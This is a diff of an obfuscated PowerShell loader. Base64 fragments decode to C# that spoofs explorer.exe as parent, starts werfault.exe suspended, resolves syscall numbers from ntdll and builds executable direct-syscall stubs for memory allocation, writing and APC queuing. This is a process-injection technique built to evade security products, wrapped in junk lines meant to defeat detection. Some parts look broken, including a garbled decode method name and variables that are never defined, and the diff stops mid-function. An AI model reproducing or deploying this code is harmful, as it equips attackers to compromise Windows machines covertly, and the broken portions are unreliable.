+$aufYatmjpg = 'GljIHN0YXRpYyBleHRlcm4gYm9vbCBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxp';
+$null = Get-Date -Format "MzlZ"
+$VaprDkFkzSSsT = 'c3QoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgaW50IGR3QXR0cmlidXRlQ291bnQsIGludCB';
+$null = Get-Date -Format "UHEH"
+$kRqxLXavNgwQjISRgYOT = 'kd0ZsYWdzLCByZWYgSW50UHRyIGxwU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMz';
+# ucYJTlwMIQZFniXstTJbaJsovqghNS
+$VhECXgXQrMTdcfKWBZ = 'IuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVyb';
+$null = Get-Date -Format "Jbwt"
+$dcPxeOEPGrEVv = 'iBib29sIFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoSW50UHRyIGxwQXR0cmlidXRlTGlz';
+$null = Get-Date -Format "HDXk"
+$TAqIUsqPWrK = 'dCwgdWludCBkd0ZsYWdzLCBJbnRQdHIgQXR0cmlidXRlLCBJbnRQdHIgbHBWYWx1ZSwgSW5';
+$yQqSkUlryXPKcVEIib = '0UHRyIGNiU2l6ZSwgSW50UHRyIGxwUHJldmlvdXNWYWx1ZSwgSW50UHRyIGxwUmV0dXJuU2';
+$vKGzWIiCtMgaeVSPuW = 'l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gd';
+$gTWPqNzZUZofu = 'HJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblByb2Nlc3ModWlu';
+$ypPSANfpvhTujo = 'dCBwcm9jZXNzQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgcHJvY2Vzc0lkKTs';
+$JoGAzrSJBuYIHyVoQWvq = 'KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaW';
+$VmqftUnLSUjgsukXQiq = 'Mgc3RydWN0IFBST0NFU1NfSU5GT1JNQVRJT04geyBwdWJsaWMgSW50UHRyIGhQcm9jZXNzO';
+$fcGCShbfmtDW = 'yBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7IHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7IHB1Ymxp';
+$XaUURBbWiEbD = 'YyBpbnQgZHdUaHJlYWRJZDsgfQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXV';
+$gPfFhbVzLXiEHTvNI = 'lbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GT0VYIHsgcHVibGljIFNUQV';
+$zJVQNaTPNZwl = 'JUVVBJTkZPIFN0YXJ0dXBJbmZvOyBwdWJsaWMgSW50UHRyIGxwQXR0cmlidXRlTGlzdDsgf';
+$wbllqxdqUy = 'QogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGlj';
+$xRSmnSIjABQ = 'IHN0cnVjdCBTVEFSVFVQSU5GTyB7IHB1YmxpYyB1aW50IGNiOyBwdWJsaWMgc3RyaW5nIGx';
+$TDyazfQuLQmHn = 'wUmVzZXJ2ZWQ7IHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOyBwdWJsaWMgc3RyaW5nIGxwVG';
+$foelfvVPSTFnfVGedlkv = 'l0bGU7IHB1YmxpYyB1aW50IGR3WDsgcHVibGljIHVpbnQgZHdZOyBwdWJsaWMgdWludCBkd';
+# vfwqWAKGPnadMtAJMGuQZUHpdByKzd
+$ZIXdTMUGFVnxRvb = '1hTaXplOyBwdWJsaWMgdWludCBkd1lTaXplOyBwdWJsaWMgdWludCBkd1hDb3VudENoYXJz';
+$GMFqqzxiYntFzp = 'OyBwdWJsaWMgdWludCBkd1lDb3VudENoYXJzOyBwdWJsaWMgdWludCBkd0ZpbGxBdHRyaWJ';
+$nutNzYOuNSqV = '1dGU7IHB1YmxpYyB1aW50IGR3RmxhZ3M7IHB1YmxpYyB1c2hvcnQgd1Nob3dXaW5kb3c7IH';
+$JdNRJzTCyf = 'B1YmxpYyB1c2hvcnQgY2JSZXNlcnZlZDI7IHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7I';
+$gtLsFjUhhxUbf = 'HB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OyBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7IHB1';
+$bSIedhsvBH = 'YmxpYyBJbnRQdHIgaFN0ZEVycm9yOyB9CgogICAgcHVibGljIGRlbGVnYXRlIGxvbmcgTnR';
+$kXoOwbOvddNgsDA = 'BbGxvY2F0ZVZpcnR1YWxNZW1vcnkoSW50UHRyIGhQcm9jLCByZWYgSW50UHRyIGJhc2VBZG';
+# FClYnAUaXQeJeJZxfPDgBviXqDXXrx
+$KKegGYLZXJifSWiEVW = 'RyLCBJbnRQdHIgemVyb0JpdHMsIHJlZiBJbnRQdHIgcmVnaW9uU2l6ZSwgdWludCBhbGxvY';
+$aJDMwxBKmB = '1R5cGUsIHVpbnQgcHJvdGVjdCk7CiAgICBwdWJsaWMgZGVsZWdhdGUgbG9uZyBOdFdyaXRl';
+# AtBhuMnRIrMDNaGItPZMWfPazdShQb
+$kaqswnwhmzid = 'VmlydHVhbE1lbW9yeShJbnRQdHIgaFByb2MsIEludFB0ciBiYXNlQWRkciwgYnl0ZVtdIGJ';
+$PsoiVrNbsqQwmntVmJmZ = '1ZmZlciwgdWludCBsZW4sIG91dCB1aW50IHdyaXR0ZW4pOwogICAgcHVibGljIGRlbGVnYX';
+$null = Get-Date -Format "vetN"
+$fsTCzTVkGmwjcU = 'RlIGxvbmcgTnRQcm90ZWN0VmlydHVhbE1lbW9yeShJbnRQdHIgaFByb2MsIHJlZiBJbnRQd';
+$jgCfjaNiGZSrwGQMYJ = 'HIgYmFzZUFkZHIsIHJlZiBJbnRQdHIgcmVnaW9uU2l6ZSwgdWludCBuZXdQcm90LCBvdXQg';
+$LfMyMXtvEzUlE = 'dWludCBvbGRQcm90KTsKICAgIHB1YmxpYyBkZWxlZ2F0ZSBsb25nIE50UXVldWVBcGNUaHJ';
+# gwXkrVzaJUiWIUAEKlupZlQEEfPxDi
+$ASxgmyqOvor = 'lYWQoSW50UHRyIGhUaHJlYWQsIEludFB0ciBhcGNSb3V0aW5lLCBJbnRQdHIgYXBjUm91dG';
+$dUulyQAdHaCpSDZLIxqK = 'luZUNvbnRleHQsIEludFB0ciBhcGNTdGF0dXNCbG9jaywgSW50UHRyIGFwY1Jlc2VydmVkK';
+$dNQiZDBOTZ = 'TsKICAgIHB1YmxpYyBkZWxlZ2F0ZSBsb25nIE50UmVzdW1lVGhyZWFkKEludFB0ciBoVGhy';
+$TapeOQOOPgjtYuQk = 'ZWFkLCBvdXQgdWludCBzdXNwZW5kQ291bnQpOwoKICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVt';
+$WzaXXuwmuYp = 'dIHN0dWIgPSB7IDB4NEMsIDB4OEIsIDB4RDEsIDB4QjgsIDB4MDAsIDB4MDAsIDB4MDAsID';
+$ZSfbmkutrR = 'B4MDAsIDB4NDksIDB4QkIsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsI';
+# QrdLBCjgdBCSEIFZvIgpaGiiisaBki
+$XSeIJDrQkxBPwVda = 'DB4MDAsIDB4MDAsIDB4NDEsIDB4RkYsIDB4RTMgfTsKCiAgICBwdWJsaWMgc3RhdGljIGlu';
+$null = Get-Date -Format "nuBO"
+$CJeuqMdDCLzmFGzofK = 'dCBHZXRTU04oc3RyaW5nIGZ1bmNOYW1lKSB7CiAgICAgICAgYnl0ZVtdIG50ZGxsID0gRml';
+$null = Get-Date -Format "tnUQ"
+$HcvgshKJgfIMVleDVdq = 'sZS5SZWFkQWxsQnl0ZXMoIkM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcbnRkbGwuZGxsIik7Ci';
+# cIqHTClhLxuoUbdKaOJeqdtFEZcoYK
+$GYCJvuwOTICMCFHuSr = 'AgICAgICAgaW50IGVfbGZhbmV3ID0gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGwsIDB4M';
+$MMGxSzqcoOVNRuVp = '0MpOwogICAgICAgIGludCBleHBvcnREaXJSdmEgPSBCaXRDb252ZXJ0ZXIuVG9JbnQzMihu';
+# AenCMMMhheRJjOYfleBvWqIjUMKNYy
+$OsrdcMKdjZcvGEhmdj = 'dGRsbCwgZV9sZmFuZXcgKyAweDg4KTsKICAgICAgICBpbnQgZXhwb3J0RGlyT2Zmc2V0ID0';
+$aYseLpQMJTZrHLp = 'gUnZhVG9PZmZzZXQobnRkbGwsIGVfbGZhbmV3LCBleHBvcnREaXJSdmEpOwogICAgICAgIA';
+$syhSYDRVJxnrFic = 'ogICAgICAgIGludCBudW1OYW1lcyA9IEJpdENvbnZlcnRlci5Ub0ludDMyKG50ZGxsLCBle';
+$mRVxfoAxRLBzv = 'HBvcnREaXJPZmZzZXQgKyAweDE4KTsKICAgICAgICBpbnQgbmFtZXNSdmEgPSBCaXRDb252';
+$oWcADakyRBQTKhB = 'ZXJ0ZXIuVG9JbnQzMihudGRsbCwgZXhwb3J0RGlyT2Zmc2V0ICsgMHgyMCk7CiAgICAgICA';
+# HfAqZWtvfyWjsighzfVWdVQeQvyflg
+$KACJwLQJzYYmZ = 'gaW50IG9yZGluYWxzUnZhID0gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGwsIGV4cG9ydE';
+$null = Get-Date -Format "CWfC"
+$bKoSZLVLtbPPsRLeCW = 'Rpck9mZnNldCArIDB4MjQpOwogICAgICAgIGludCBmdW5jc1J2YSA9IEJpdENvbnZlcnRlc';
+$nXIlxwbXoqw = 'i5Ub0ludDMyKG50ZGxsLCBleHBvcnREaXJPZmZzZXQgKyAweDFDKTsKICAgICAgICAKICAg';
+$GDTnawMVFPescQWmJrG = 'ICAgICBpbnQgbmFtZXNPZmZzZXQgPSBSdmFUb09mZnNldChudGRsbCwgZV9sZmFuZXcsIG5';
+$dsxtamnzBQkvaAGSH = 'hbWVzUnZhKTsKICAgICAgICBpbnQgb3JkaW5hbHNPZmZzZXQgPSBSdmFUb09mZnNldChudG';
+$VcMRrGqtyTGwimh = 'RsbCwgZV9sZmFuZXcsIG9yZGluYWxzUnZhKTsKICAgICAgICBpbnQgZnVuY3NPZmZzZXQgP';
+$caRnsJIrfNLk = 'SBSdmFUb09mZnNldChudGRsbCwgZV9sZmFuZXcsIGZ1bmNzUnZhKTsKICAgICAgICAKICAg';
+$CWJIPdyFHjOOYfcel = 'ICAgICBmb3IgKGludCBpID0gMDsgaSA8IG51bU5hbWVzOyBpKyspIHsKICAgICAgICAgICA';
+$REZYNxwAXpzmMdgLpBS = 'gaW50IG5hbWVSdmEgPSBCaXRDb252ZXJ0ZXIuVG9JbnQzMihudGRsbCwgbmFtZXNPZmZzZX';
+# ZsafcaWsWvhSVBKySuTZRSktlACfsh
+$jhVIPRQgadNxwlx = 'QgKyAoaSAqIDQpKTsKICAgICAgICAgICAgc3RyaW5nIG5hbWUgPSBHZXRTdHJpbmcobnRkb';
+$null = Get-Date -Format "BJwd"
+$IlxJpKsxOqwuEFvjTiw = 'GwsIFJ2YVRvT2Zmc2V0KG50ZGxsLCBlX2xmYW5ldywgbmFtZVJ2YSkpOwogICAgICAgICAg';
+$AhYnSuacLbyakJ = 'ICBpZiAobmFtZSA9PSBmdW5jTmFtZSkgewogICAgICAgICAgICAgICAgc2hvcnQgb3JkaW5';
+# udJnKBNdZbKBKfhOgagnYknvkPVJnM
+$eYPWjNXzrVrwTCX = 'hbCA9IEJpdENvbnZlcnRlci5Ub0ludDE2KG50ZGxsLCBvcmRpbmFsc09mZnNldCArIChpIC';
+$ljizJyVwGyI = 'ogMikpOwogICAgICAgICAgICAgICAgaW50IGZ1bmNSdmEgPSBCaXRDb252ZXJ0ZXIuVG9Jb';
+$XTwsCDfeHz = 'nQzMihudGRsbCwgZnVuY3NPZmZzZXQgKyAob3JkaW5hbCAqIDQpKTsKICAgICAgICAgICAg';
+$BbtpkImEkjzmG = 'ICAgIGludCBmdW5jT2Zmc2V0ID0gUnZhVG9PZmZzZXQobnRkbGwsIGVfbGZhbmV3LCBmdW5';
+$BDHzuBGrLgTclPTthV = 'jUnZhKTsKICAgICAgICAgICAgICAgIGlmIChudGRsbFtmdW5jT2Zmc2V0XSA9PSAweDRDIC';
+# jQlRhhQSuhxKCkEKBQZRuUuveRXyMj
+$TsJPgvMBaflcwOM = 'YmIG50ZGxsW2Z1bmNPZmZzZXQrM10gPT0gMHhCOCkKICAgICAgICAgICAgICAgICAgICByZ';
+$FZjCHdYKbRCtjeO = 'XR1cm4gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGwsIGZ1bmNPZmZzZXQgKyA0KTsKICAg';
+$null = Get-Date -Format "qfPY"
+$TooFxiVEeCIgWUq = 'ICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gLTE7CiAgICB9CgogICAgcHJ';
+$nkPdDVjxeROiQToXCpUv = 'pdmF0ZSBzdGF0aWMgaW50IFJ2YVRvT2Zmc2V0KGJ5dGVbXSBmaWxlLCBpbnQgZV9sZmFuZX';
+$uawprhVjQOpqYDfP = 'csIGludCBydmEpIHsKICAgICAgICBzaG9ydCBudW1TZWN0aW9ucyA9IEJpdENvbnZlcnRlc';
+$rYztuyVqSTpweoGVME = 'i5Ub0ludDE2KGZpbGUsIGVfbGZhbmV3ICsgMHgwNik7CiAgICAgICAgZm9yIChpbnQgaSA9';
+# hjXHVyyJMPetlUxiVbmoCAWCECbbWi
+$PlNuVNKIVxkk = 'IDA7IGkgPCBudW1TZWN0aW9uczsgaSsrKSB7CiAgICAgICAgICAgIGludCBzZWN0aW9uT2Z';
+$HwtfYoYEwB = 'mc2V0ID0gZV9sZmFuZXcgKyAweDEwOCArIChpICogMHgyOCk7CiAgICAgICAgICAgIGludC';
+$sSoHXPeyfJ = 'B2aXJ0dWFsU2l6ZSA9IEJpdENvbnZlcnRlci5Ub0ludDMyKGZpbGUsIHNlY3Rpb25PZmZzZ';
+$null = Get-Date -Format "BlDK"
+$uxcZpDNVPfS = 'XQgKyAweDA4KTsKICAgICAgICAgICAgaW50IHZpcnR1YWxBZGRyID0gQml0Q29udmVydGVy';
+$vqEAtksYZAtNdXt = 'LlRvSW50MzIoZmlsZSwgc2VjdGlvbk9mZnNldCArIDB4MEMpOwogICAgICAgICAgICBpbnQ';
+$null = Get-Date -Format "wppj"
+$WwASMnNPRNF = 'gcmF3RGF0YUFkZHIgPSBCaXRDb252ZXJ0ZXIuVG9JbnQzMihmaWxlLCBzZWN0aW9uT2Zmc2';
+$QOndCDufSMAE = 'V0ICsgMHgxNCk7CiAgICAgICAgICAgIGlmIChydmEgPj0gdmlydHVhbEFkZHIgJiYgcnZhI';
+$null = Get-Date -Format "ASxA"
+$NFzdCPSDFOCHswhh = 'DwgdmlydHVhbEFkZHIgKyB2aXJ0dWFsU2l6ZSkKICAgICAgICAgICAgICAgIHJldHVybiBy';
+$null = Get-Date -Format "Ogxr"
+$fcOhPtPtRDWbdypfjZs = 'dmEgLSB2aXJ0dWFsQWRkciArIHJhd0RhdGFBZGRyOwogICAgICAgIH0KICAgICAgICByZXR';
+$KruqsnBrSrazVC = '1cm4gcnZhOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHN0cmluZyBHZXRTdHJpbmcoYn';
+# wNPqJmbyBrCFaPHnQcdnTulefwPyRx
+$kJvDdKpbxI = 'l0ZVtdIGZpbGUsIGludCBvZmZzZXQpIHsKICAgICAgICBpbnQgbGVuID0gMDsKICAgICAgI';
+$mElTzULiAResYl = 'CB3aGlsZSAoZmlsZVtvZmZzZXQgKyBsZW5dICE9IDApIGxlbisrOwogICAgICAgIHJldHVy';
+$null = Get-Date -Format "sxDk"
+$FshpYItkAkLVg = 'biBFbmNvZGluZy5BU0NJSS5HZXRTdHJpbmcoZmlsZSwgb2Zmc2V0LCBsZW4pOwogICAgfQo';
+$mWXhmokUMFcEgKxHln = 'KICAgIHB1YmxpYyBzdGF0aWMgSW50UHRyIEdldFN5c2NhbGxQdHIoc3RyaW5nIGZ1bmNOYW';
+$KhcPTLQSfIcxvbavXN = '1lKSB7CiAgICAgICAgSW50UHRyIG50ZGxsID0gR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kb';
+$aZhQHcGFZqHB = 'GwiKTsKICAgICAgICBJbnRQdHIgZnVuY0FkZHIgPSBHZXRQcm9jQWRkcmVzcyhudGRsbCwg';
+$HeNfAuatNiQUamk = 'ZnVuY05hbWUpOwogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgNjQ7IGkrKykgewogICA';
+$roBVkDrwLQt = 'gICAgICAgICBpZiAoTWFyc2hhbC5SZWFkQnl0ZShmdW5jQWRkciwgaSkgPT0gMHgwRiAmJi';
+$WzHnAMxssksiZeqApNIU = 'BNYXJzaGFsLlJlYWRCeXRlKGZ1bmNBZGRyLCBpICsgMSkgPT0gMHgwNSkKICAgICAgICAgI';
+$WuSZdFMIul = 'CAgICAgIHJldHVybiAoSW50UHRyKSgobG9uZylmdW5jQWRkciArIGkpOwogICAgICAgIH0K';
+$null = Get-Date -Format "CWoj"
+$DjmTgJTZEG = 'ICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICB9CgogICAgW0RsbEltcG9ydCgia2V';
+$LegLxSvKzq = 'ybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW';
+$null = Get-Date -Format "BQZv"
+$rYedJDRfhnojkknj = '5kbGUoc3RyaW5nIG0pOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpY';
+$SdISLRKmZJbHKqqmjdH = 'yBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCwgc3RyaW5n';
+$null = Get-Date -Format "VvNC"
+$peswezaRlGasvGTCnHd = 'IG4pOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh';
+$null = Get-Date -Format "HOMY"
+$bguSsXjLrOK = '0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBkd1';
+$null = Get-Date -Format "VNCk"
+$RNCFxFCsnq = 'NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0K';
+$iuYdLrZrJzYcnxUJHIPX = $NXiEpHLjnVXgDSidos + $GAoGjKcSaayxZtmOYkI + $QQAcmVotBttxBYKf + $QCHBOFpKFqNQeWzVHBxB + $vDdtAijedAVB + $GIDeXNErDlbdZUSZyPK + $vvbSfASZcoRBzqbJa + $xFuKMebrsQpAy + $nwrvPbueaGCFCkak + $tPGOWQHNOCwwoaVIdoQ + $wiIZgCAjaNozymTW + $aufYatmjpg + $VaprDkFkzSSsT + $kRqxLXavNgwQjISRgYOT + $VhECXgXQrMTdcfKWBZ + $dcPxeOEPGrEVv + $TAqIUsqPWrK + $yQqSkUlryXPKcVEIib + $vKGzWIiCtMgaeVSPuW + $gTWPqNzZUZofu + $ypPSANfpvhTujo + $JoGAzrSJBuYIHyVoQWvq + $VmqftUnLSUjgsukXQiq + $fcGCShbfmtDW + $XaUURBbWiEbD + $gPfFhbVzLXiEHTvNI + $zJVQNaTPNZwl + $wbllqxdqUy + $xRSmnSIjABQ + $TDyazfQuLQmHn + $foelfvVPSTFnfVGedlkv + $ZIXdTMUGFVnxRvb + $GMFqqzxiYntFzp + $nutNzYOuNSqV + $JdNRJzTCyf + $gtLsFjUhhxUbf + $bSIedhsvBH + $kXoOwbOvddNgsDA + $KKegGYLZXJifSWiEVW + $aJDMwxBKmB + $kaqswnwhmzid + $PsoiVrNbsqQwmntVmJmZ + $fsTCzTVkGmwjcU + $jgCfjaNiGZSrwGQMYJ + $LfMyMXtvEzUlE + $ASxgmyqOvor + $dUulyQAdHaCpSDZLIxqK + $dNQiZDBOTZ + $TapeOQOOPgjtYuQk + $WzaXXuwmuYp + $ZSfbmkutrR + $XSeIJDrQkxBPwVda + $CJeuqMdDCLzmFGzofK + $HcvgshKJgfIMVleDVdq + $GYCJvuwOTICMCFHuSr + $MMGxSzqcoOVNRuVp + $OsrdcMKdjZcvGEhmdj + $aYseLpQMJTZrHLp + $syhSYDRVJxnrFic + $mRVxfoAxRLBzv + $oWcADakyRBQTKhB + $KACJwLQJzYYmZ + $bKoSZLVLtbPPsRLeCW + $nXIlxwbXoqw + $GDTnawMVFPescQWmJrG + $dsxtamnzBQkvaAGSH + $VcMRrGqtyTGwimh + $caRnsJIrfNLk + $CWJIPdyFHjOOYfcel + $REZYNxwAXpzmMdgLpBS + $jhVIPRQgadNxwlx + $IlxJpKsxOqwuEFvjTiw + $AhYnSuacLbyakJ + $eYPWjNXzrVrwTCX + $ljizJyVwGyI + $XTwsCDfeHz + $BbtpkImEkjzmG + $BDHzuBGrLgTclPTthV + $TsJPgvMBaflcwOM + $FZjCHdYKbRCtjeO + $TooFxiVEeCIgWUq + $nkPdDVjxeROiQToXCpUv + $uawprhVjQOpqYDfP + $rYztuyVqSTpweoGVME + $PlNuVNKIVxkk + $HwtfYoYEwB + $sSoHXPeyfJ + $uxcZpDNVPfS + $vqEAtksYZAtNdXt + $WwASMnNPRNF + $QOndCDufSMAE + $NFzdCPSDFOCHswhh + $fcOhPtPtRDWbdypfjZs + $KruqsnBrSrazVC + $kJvDdKpbxI + $mElTzULiAResYl + $FshpYItkAkLVg + $mWXhmokUMFcEgKxHln + $KhcPTLQSfIcxvbavXN + $aZhQHcGFZqHB + $HeNfAuatNiQUamk + $roBVkDrwLQt + $WzHnAMxssksiZeqApNIU + $WuSZdFMIul + $DjmTgJTZEG + $LegLxSvKzq + $rYedJDRfhnojkknj + $SdISLRKmZJbHKqqmjdH + $peswezaRlGasvGTCnHd + $bguSsXjLrOK + $RNCFxFCsnq;
+# IVvGTkGaXbYMcPtXHEjkrSDgempTJg
+$RApDfGSlUEExkpYmnDPK = [System.Text.Encoding]::UTF8.YwztSiTWjORn([System.Convert]::FromBase64String($iuYdLrZrJzYcnxUJHIPX))
 
-Add-Type -TypeDefinition $jsYhALOHKSxqwfENwcpO
+Add-Type -TypeDefinition $RApDfGSlUEExkpYmnDPK
 
-function CCUQmiDmNQya {
-    param($LhHfNyfMBFToopET)
-$null = Get-Date -Format "uxPd"
-    $tGozquZFzGe = Get-Process explorer | Select-Object -First 1
-    $pDGUTtLJXYNEMKaI = New-Object bMazpMKnViMk+PROCESS_INFORMATION
-    $UwpWqSiQrCUbjVfvZ = New-Object bMazpMKnViMk+STARTUPINFOEX
-    $UwpWqSiQrCUbjVfvZ.StartupInfo.cb = [Marshal]::SizeOf($UwpWqSiQrCUbjVfvZ)
-# PiHNjBHSAnPpdHqqYsAzygvgkcJaLc
-    $VwVaHukceyDMv = [IntPtr]::Zero
-    [bMazpMKnViMk]::InitializeProcThreadAttributeList($null, 1, 0, [ref]$VwVaHukceyDMv)
-    $HKKvoHWcbJbKCGj = [Marshal]::AllocHGlobal($VwVaHukceyDMv)
-    [bMazpMKnViMk]::InitializeProcThreadAttributeList($HKKvoHWcbJbKCGj, 1, 0, [ref]$VwVaHukceyDMv)
-# YTteKYkSEuqtVgkWdiLNaJiaGfGrdD
-    $oJpVeIDmHYIpydUCL = [bMazpMKnViMk]::OpenProcess(0x1F0FFF, $false, $tGozquZFzGe.Id)
-    $hlQMjUHNINnKQ = [Marshal]::AllocHGlobal([IntPtr]::Size); [Marshal]::WriteIntPtr($hlQMjUHNINnKQ, $oJpVeIDmHYIpydUCL)
-$null = Get-Date -Format "TXrs"
-    [bMazpMKnViMk]::UpdateProcThreadAttribute($HKKvoHWcbJbKCGj, 0, 0x20000, $hlQMjUHNINnKQ, [IntPtr]::Size, 0, 0)
-$null = Get-Date -Format "USTk"
-    $UwpWqSiQrCUbjVfvZ.lpAttributeList = $HKKvoHWcbJbKCGj
+function dWhceaVuvOYh {
+    param($RfqrRVhpulSgMclDubgM)
+    $cLqhSlNLWCiKisLLxN = Get-Process explorer | Select-Object -First 1
+$null = Get-Date -Format "mbuG"
+    $duUFsiWmCyVfBo = New-Object THVZObTuZHOT+PROCESS_INFORMATION
+    $GdfuSIbuDfNsWGPw = New-Object THVZObTuZHOT+STARTUPINFOEX
+# rKkDeHXJfAefDddQWOYnKUmHoIlzlv
+    $GdfuSIbuDfNsWGPw.StartupInfo.cb = [Marshal]::SizeOf($GdfuSIbuDfNsWGPw)
+    $OTgTfFqfqgkKBnNEw = [IntPtr]::Zero
+    [THVZObTuZHOT]::InitializeProcThreadAttributeList($null, 1, 0, [ref]$OTgTfFqfqgkKBnNEw)
+    $GlmbMmGLnwvDMUSdkEje = [Marshal]::AllocHGlobal($OTgTfFqfqgkKBnNEw)
+# eBZzpaAlVVdSegvVCjRRmZWOYCRMkt
+    [THVZObTuZHOT]::InitializeProcThreadAttributeList($GlmbMmGLnwvDMUSdkEje, 1, 0, [ref]$OTgTfFqfqgkKBnNEw)
+$null = Get-Date -Format "AxEq"
+    $sWRXdpcFUMi = [THVZObTuZHOT]::OpenProcess(0x1F0FFF, $false, $cLqhSlNLWCiKisLLxN.Id)
+$null = Get-Date -Format "sCZL"
+    $ApPXRDVgbgbVILXH = [Marshal]::AllocHGlobal([IntPtr]::Size); [Marshal]::WriteIntPtr($ApPXRDVgbgbVILXH, $sWRXdpcFUMi)
+$null = Get-Date -Format "ugqo"
+    [THVZObTuZHOT]::UpdateProcThreadAttribute($GlmbMmGLnwvDMUSdkEje, 0, 0x20000, $ApPXRDVgbgbVILXH, [IntPtr]::Size, 0, 0)
+    $GdfuSIbuDfNsWGPw.lpAttributeList = $GlmbMmGLnwvDMUSdkEje
+$null = Get-Date -Format "RrnC"
 
-    $pKfWWsiIRRFim = "C:\Windows\System32\werfault.exe"
-$null = Get-Date -Format "UPTp"
-    if (-not [bMazpMKnViMk]::CreateProcess($null, $pKfWWsiIRRFim, 0, 0, $false, 0x80004, 0, $null, [ref]$UwpWqSiQrCUbjVfvZ, [out]$pDGUTtLJXYNEMKaI)) { return }
+$null = Get-Date -Format "caen"
+    $aMMSOeyvhrvsu = "C:\Windows\System32\werfault.exe"
+    if (-not [THVZObTuZHOT]::CreateProcess($null, $aMMSOeyvhrvsu, 0, 0, $false, 0x80004, 0, $null, [ref]$GdfuSIbuDfNsWGPw, [out]$duUFsiWmCyVfBo)) { return }
+# TSTMAVtvADQqeJkMiDZdzAtLiWpglc
 
-    $FkSpqAGVmuUiw = [bMazpMKnViMk]::stub.Clone()
-# wcFZuCHeRVPOJUJuSljSeEhvmsHTqs
+    $kMZIYWQeUuZEhxjuGc = [THVZObTuZHOT]::stub.Clone()
     
     # Allocate stub memory via .NET (RW)
-    $BxvpVEWDIs = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(64)
+    $IghEHTdJHIR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(64)
     # FIX: Make it Executable (RWX) so we can run the syscall stub
-    $XNipEIkBCbveZBwj = 0
-    [bMazpMKnViMk]::VirtualProtect($BxvpVEWDIs, [UIntPtr]64, 0x40, [out]$XNipEIkBCbveZBwj)
-$null = Get-Date -Format "HBqz"
+# psUWWlCeMRrLVsMZUCfNuElnWmEBft
+    $SQglsGJINcdbsciWB = 0
+# qrbdrCFdVHJOtCMPevAsKapRZOQWes
+    [THVZObTuZHOT]::VirtualProtect($IghEHTdJHIR, [UIntPtr]64, 0x40, [out]$SQglsGJINcdbsciWB)
+# GxRPknYvsVsEJpeWsiIUlCicneyfDe
 
-    function fQLZAmOWfRgQ($VwVaHukceyDMvjORQtYpuoLZcaZB, $mQDKIxzwdFpiCxzAmI) {
-        $ynHAbNUGfLRtuDnhxew = [bMazpMKnViMk]::LbdoKoFoZKfY($VwVaHukceyDMvjORQtYpuoLZcaZB)
-        $mEgIMIDbPKXIgxHvTVL = [bMazpMKnViMk]::YsDJYmMHlIgi($VwVaHukceyDMvjORQtYpuoLZcaZB)
-        [BitConverter]::GetBytes($ynHAbNUGfLRtuDnhxew).CopyTo($FkSpqAGVmuUiw, 4)
-        [BitConverter]::GetBytes([long]$mEgIMIDbPKXIgxHvTVL).CopyTo($FkSpqAGVmuUiw, 10)
-        [Marshal]::Copy($FkSpqAGVmuUiw, 0, $BxvpVEWDIs, 21)
-        $wdoNNLyLiY = [bMazpMKnViMk].GetNestedType($VwVaHukceyDMvjORQtYpuoLZcaZB)
-# TOPgYbIuFGAAeBAFPulWaUwWIvQaAh
-        $qyrxCwJGOy = [Marshal]::GetDelegateForFunctionPointer($BxvpVEWDIs, $wdoNNLyLiY)
-$null = Get-Date -Format "OMwC"
-        return $qyrxCwJGOy.Invoke($mQDKIxzwdFpiCxzAmI)
+# MSHfrOeHGkzyMuBXlqzikiyyeaUZfq
+    function oaFArNYJdVee($EEVgUvwwcrWKEBL, $DylGvmGlKiQilqSpT) {
+        $ijXhutejIutgfm = [THVZObTuZHOT]::jXnEgwchhBMX($EEVgUvwwcrWKEBL)
+        $HkgVkwTrUgjULGRGxMtn = [THVZObTuZHOT]::ljALegyRrbZa($EEVgUvwwcrWKEBL)
+        [BitConverter]::GetBytes($ijXhutejIutgfm).CopyTo($kMZIYWQeUuZEhxjuGc, 4)
